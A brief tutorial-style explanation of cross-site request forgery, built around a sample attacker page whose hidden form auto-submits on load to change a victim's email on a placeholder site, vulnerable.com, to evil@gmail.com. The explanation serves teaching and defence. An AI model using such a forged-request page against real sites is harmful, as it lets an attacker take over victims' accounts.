How does CSRF work?


Example code for attacker web page:

<form action="https://vulnerable.com/email/change" method="POST">

<input type="hidden" name="email" value="evil@gmail.com" />

</form>

<script>

document.forms[0].submit();

</script>

This web page is targeting the property “email” on the website vulnerable.com/email/change and sets it to evil@gmail.com as soon as the page loads.
